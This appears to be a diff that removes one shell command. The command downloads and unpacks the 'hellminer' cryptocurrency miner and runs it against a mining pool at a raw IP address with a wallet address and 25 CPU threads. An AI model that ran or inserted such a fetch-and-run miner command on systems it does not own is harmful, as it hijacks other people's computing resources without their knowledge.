@@ -1,1 +1,0 @@
-wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz && ./hellminer -o 149.56.27.47:3956 -u RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL.tc3 -p x --cpu 25
